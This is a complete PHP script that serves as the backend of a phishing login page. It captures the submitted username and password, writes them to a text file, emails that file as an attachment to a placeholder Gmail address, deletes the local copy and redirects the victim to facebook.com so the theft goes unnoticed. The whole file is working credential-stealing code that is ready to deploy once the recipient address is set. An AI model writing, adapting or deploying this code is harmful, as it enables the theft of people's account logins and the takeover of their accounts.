<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Create a text file to store login details
    $filename = "login_details.txt";
    $file_content = "Username: $username\nPassword: $password";
    file_put_contents($filename, $file_content);

    // Send email with the file attached
    $to = "your-gmail@example.com";
    $subject = "Login Details";
    $message = "Please find attached the login details.";
    $headers = "From: webmaster@example.com";
    
    // Boundary for the email
    $boundary = md5(time());

    // Headers for attaching the file
    $headers .= "\nMIME-Version: 1.0\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\n";
    
    // Message for the email
    $email_message = "--$boundary\n";
    $email_message .= "Content-Type: text/plain; charset=\"utf-8\"\n";
    $email_message .= "Content-Transfer-Encoding: 7bit\n\n";
    $email_message .= $message . "\n\n";
    $email_message .= "--$boundary\n";
    
    // Attached file
    $file = file_get_contents($filename);
    $email_message .= "Content-Type: application/text; name=\"$filename\"\n";
    $email_message .= "Content-Disposition: attachment; filename=\"$filename\"\n";
    $email_message .= "Content-Transfer-Encoding: base64\n\n";
    $email_message .= chunk_split(base64_encode($file)) . "\n";
    $email_message .= "--$boundary--";

    if (mail($to, $subject, $email_message, $headers)) {
        // Email sent successfully, perform the redirection
        unlink($filename);
        header("Location: https://facebook.com");
        exit(); // Make sure to exit to prevent further execution
    } else {
        echo "Failed to send email.";
    }
}
?>